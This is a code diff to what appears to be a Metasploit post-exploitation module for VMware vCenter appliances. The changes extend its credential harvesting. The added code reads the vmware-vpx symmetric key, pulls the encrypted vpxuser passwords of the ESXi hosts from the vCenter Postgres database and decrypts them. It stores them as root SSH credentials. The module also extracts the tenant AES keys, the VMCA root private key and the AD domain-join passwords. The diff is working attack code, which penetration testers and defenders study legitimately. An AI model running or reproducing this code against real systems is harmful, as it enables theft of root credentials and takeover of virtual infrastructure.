@@ -72,8 +72,12 @@ class MetasploitModule < Msf::Post
     print_status('Extracting PostgreSQL database credentials ...')
     get_db_creds
 
+    if @vc_sym_key
+      enum_vpxuser_creds
+    end
+
     if datastore['DUMP_VMDIR']
-      print_status('Extracting vSphere SSO domain information ...')
+      print_status('Extracting vSphere SSO domain secrets ...')
       vmdir_dump
 
     end
@@ -151,7 +155,7 @@ class MetasploitModule < Msf::Post
 
     store_valid_credential(user: @bind_dn, private: @bind_pw, service_data: extra_service_data)
 
-    get_tenant_aes_key
+    get_aes_keys
   end
 
   def vmdir_dump
@@ -166,7 +170,6 @@ class MetasploitModule < Msf::Post
     #       side effect.
     print_status('Dumping vmdir schema to LDIF ...')
     shell_cmd = "/opt/likewise/bin/ldapsearch -b '#{@base_dn}' -s sub -D '#{@bind_dn}' -w #{@shell_bind_pw} \\* \\+ \\- \> #{temp_ldif_file}"
-    vprint_status("shell_cmd: #{shell_cmd}")
     cmd_exec(shell_cmd)
 
     vprint_status("Copying LDF from remote folder #{temp_ldif_file} to loot ...")
@@ -201,6 +204,9 @@ class MetasploitModule < Msf::Post
     get_idp_cert
     shell_cmd = '/usr/lib/vmware-vmafd/bin/vecs-cli store list'
     vecs_stores = cmd_exec(shell_cmd).split("\n")
+    unless vecs_stores.first
+      fail_with(Msf::Exploit::Failure::Unknown, 'Empty vecs-cli store list returned from vCenter')
+    end
 
     vecs_stores.each do |vecs_store|
       shell_cmd = "/usr/lib/vmware-vmafd/bin/vecs-cli entry list --store #{vecs_store} | grep 'Entry type :' | awk -F ':' '{print $2}' | tr -d \"\t\""
@@ -208,9 +214,7 @@ class MetasploitModule < Msf::Post
       next unless vecs_entry_type == 'private key'
 
       shell_cmd = "/usr/lib/vmware-vmafd/bin/vecs-cli entry list --store #{vecs_store} | grep 'Alias :' | awk -F ':' '{print $2}' | tr -d \"\t\""
-      next unless (vecs_entry_alias = cmd_exec(shell_cmd))
-
-      get_vecs_entry(vecs_store, vecs_entry_alias)
+      get_vecs_entry(vecs_store, cmd_exec(shell_cmd))
     end
   end
 
@@ -238,6 +242,11 @@ class MetasploitModule < Msf::Post
 
   def get_vmca_cert
     vprint_status('Extract VMCA_ROOT key ...')
+
+    unless file_exist?('/var/lib/vmware/vmca/privatekey.pem') && file_exist?('/var/lib/vmware/vmca/root.cer')
+      fail_with(Msf::Exploit::Failure::Unknown, 'Could not locate VMCA_ROOT keypair')
+    end
+
     vmca_key_b64 = cmd_exec('cat /var/lib/vmware/vmca/privatekey.pem')
 
     unless (vmca_key = OpenSSL::PKey::RSA.new(vmca_key_b64))
@@ -255,7 +264,7 @@ class MetasploitModule < Msf::Post
     end
 
     unless vmca_cert.check_private_key(vmca_key)
-      fail_with(Msf::Exploit::Failure::Unknown, 'VMCA_ROOT certificate and private key mismatch!')
+      fail_with(Msf::Exploit::Failure::Unknown, 'VMCA_ROOT certificate and private key mismatch')
     end
 
     p = store_loot('vmca', 'PEM', rhost, vmca_cert, 'VMCA_ROOT.pem', 'vCenter VMCA root CA certificate')
@@ -366,7 +375,7 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def get_tenant_aes_key
+  def get_aes_keys
     # https://github.com/vmware/lightwave/blob/master/vmidentity/install/src/main/java/com/vmware/identity/installer/SystemDomainAdminUpdateUtils.java#L72-L78
     print_status('Extract vmdird tenant AES encryption keys ...')
     shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectClass=vmwSTSTenant)\" vmwSTSTenantKey"
@@ -376,21 +385,21 @@ class MetasploitModule < Msf::Post
       fail_with(Msf::Exploit::Failure::Unknown, 'Error extracting tenant AES encryption key')
     end
 
-    tenant_aes_key = tenant_key.split(': ').last.encode('iso-8859-1')
+    tenant_aes_key = tenant_key.split('vmwSTSTenantKey: ').last.encode('iso-8859-1')
     case tenant_aes_key.length
     when 16
       @vc_tenant_aes_key = tenant_aes_key
-      @vc_tenant_aes_key_hex = "0x#{@vc_tenant_aes_key.unpack('H*').first}"
+      @vc_tenant_aes_key_hex = @vc_tenant_aes_key.unpack('H*').first
       vprint_status("vCenter returned a plaintext AES key: #{tenant_aes_key}")
     when 24
       @vc_tenant_aes_key = Base64.strict_decode64(tenant_aes_key)
-      @vc_tenant_aes_key_hex = "0x#{Base64.strict_decode64(tenant_aes_key).unpack('H*').first}"
+      @vc_tenant_aes_key_hex = Base64.strict_decode64(tenant_aes_key).unpack('H*').first
       vprint_status("vCenter returned a Base64 AES key: #{tenant_aes_key}")
     else
       fail_with(Msf::Exploit::Failure::Unknown, "Invalid tenant AES encryption key size - expecting 16 raw bytes or 24 Base64 bytes, got #{tenant_aes_key.length}")
     end
 
-    print_good("vSphere Tenant AES encryption key: #{@vc_tenant_aes_key} hex: #{@vc_tenant_aes_key_hex}")
+    print_good("vSphere Tenant AES encryption key: #{tenant_aes_key} hex: #{@vc_tenant_aes_key_hex}")
 
     extra_service_data = {
       address: Rex::Socket.getaddress(rhost),
@@ -404,7 +413,31 @@ class MetasploitModule < Msf::Post
       realm_value: @base_fqdn
     }
 
-    store_valid_credential(user: 'AES key', private: @vc_tenant_aes_key, service_data: extra_service_data)
+    store_valid_credential(user: 'STS AES key', private: tenant_aes_key, service_data: extra_service_data)
+
+    print_status('Extract vmware-vpx AES key ...')
+    unless file_exist?('/etc/vmware-vpx/ssl/symkey.dat')
+      print_error('Could not locate /etc/vmware-vpx/ssl/symkey.dat, vpxuser credential decryption will not be possible')
+      return
+    end
+
+    sym_key = cmd_exec('cat /etc/vmware-vpx/ssl/symkey.dat')
+    @vc_sym_key = sym_key.scan(/../).map(&:hex).pack('C*')
+    print_good("vmware-vpx AES encryption key hex: #{sym_key}")
+
+    extra_service_data = {
+      address: Rex::Socket.getaddress(rhost),
+      port: 389,
+      service_name: 'ldap',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id,
+      module_fullname: fullname,
+      origin_type: :service,
+      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+      realm_value: @base_fqdn
+    }
+
+    store_valid_credential(user: 'VPX AES key', private: sym_key, service_data: extra_service_data)
   end
 
   def tenant_aes_decrypt(b64)
@@ -414,6 +447,19 @@ class MetasploitModule < Msf::Post
     decipher.decrypt
     decipher.padding = 0
     decipher.key = @vc_tenant_aes_key
+    (decipher.update(ciphertext) + decipher.final).delete("\000")
+  end
+
+  def vpx_aes_decrypt(b64)
+    # https://www.pentera.io/wp-content/uploads/2022/03/Sensitive-Information-Disclosure_VMware-vCenter_f.pdf
+    secret_bytes = Base64.strict_decode64(b64)
+    iv = secret_bytes[0, 16]
+    ciphertext = secret_bytes[16, 64]
+    decipher = OpenSSL::Cipher.new('aes-256-cbc')
+    decipher.decrypt
+    decipher.iv = iv
+    decipher.padding = 1
+    decipher.key = @vc_sym_key
     (decipher.update(ciphertext) + decipher.final).delete("\000")
   end
 
@@ -631,7 +677,13 @@ class MetasploitModule < Msf::Post
       end
 
       print_status("AD domain join account found for vpx_customization_spec '#{spec}':")
-      print_good("AD User: #{domain_user}@#{domain_base}")
+
+      case domain_base.include?('.')
+      when true
+        print_good("AD User: #{domain_user}@#{domain_base}")
+      when false
+        print_good("AD User: #{domain_base}\\#{domain_user}")
+      end
       print_good("AD Pass: #{secret_plaintext}")
 
       extra_service_data = {
@@ -647,6 +699,39 @@ class MetasploitModule < Msf::Post
       }
 
       store_valid_credential(user: domain_user, private: secret_plaintext, service_data: extra_service_data)
+    end
+  end
+
+  def enum_vpxuser_creds
+    print_status('Extract ESXi host vpxuser credentials ...')
+    shell_cmd = "export PGPASSWORD=#{@shell_vcdb_pass}; /opt/vmware/vpostgres/current/bin/psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c 'SELECT dns_name, ip_address, user_name, password FROM vc.vpx_host;' -P pager -A -t"
+    vpxuser_rows = cmd_exec(shell_cmd).split("\n")
+
+    unless vpxuser_rows
+      print_warning('No ESXi hosts attached to this vCenter system')
+      return
+    end
+
+    vpxuser_rows.each do |vpxuser_row|
+      esxi_fqdn = vpxuser_row.split('|')[0]
+      esxi_ipv4 = vpxuser_row.split('|')[1]
+      esxi_user = vpxuser_row.split('|')[2]
+      vpxuser_secret_b64 = vpxuser_row.split('|')[3].gsub('*', '')
+      esxi_pass = vpx_aes_decrypt(vpxuser_secret_b64)
+      print_good("ESXi Host #{esxi_fqdn} [#{esxi_ipv4}] #{esxi_user} PW: #{esxi_pass}")
+      extra_service_data = {
+        address: esxi_ipv4,
+        port: 22,
+        protocol: 'tcp',
+        service_name: 'ssh',
+        workspace_id: myworkspace_id,
+        module_fullname: fullname,
+        origin_type: :service,
+        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+        realm_value: esxi_fqdn
+      }
+
+      store_valid_credential(user: 'root', private: esxi_pass, service_data: extra_service_data)
     end
   end
 
@@ -748,25 +833,32 @@ class MetasploitModule < Msf::Post
   end
 
   def validate_target
+    unless command_exists?('/usr/sbin/vpxd')
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /usr/sbin/vpxd (is this host a vCenter appliance?)')
+    end
+
     unless command_exists?('/usr/lib/vmware-vmafd/bin/vmafd-cli')
-      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find vmafd-cli (is this host a vCenter appliance?)')
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /usr/lib/vmware-vmafd/bin/vmafd-cli')
     end
 
     unless command_exists?('/usr/lib/vmware-vmafd/bin/vecs-cli')
-      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find vecs-cli (is this host a vCenter appliance?)')
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /usr/lib/vmware-vmafd/bin/vecs-cli')
     end
 
     unless command_exists?('/opt/likewise/bin/lwregshell')
-      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find lwregshell (is this host a vCenter appliance?)')
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /opt/likewise/bin/lwregshell')
     end
 
     unless command_exists?('/opt/likewise/bin/ldapsearch')
-      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find likewise ldapsearch')
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /opt/likewise/bin/ldapsearch')
     end
 
     unless command_exists?('/opt/vmware/vpostgres/current/bin/psql')
-      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find psql')
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /opt/vmware/vpostgres/current/bin/psql')
     end
+
+    @vcsa_build = cmd_exec('/usr/sbin/vpxd -v').split("\n").last
+    print_status(@vcsa_build)
   end
 
 end
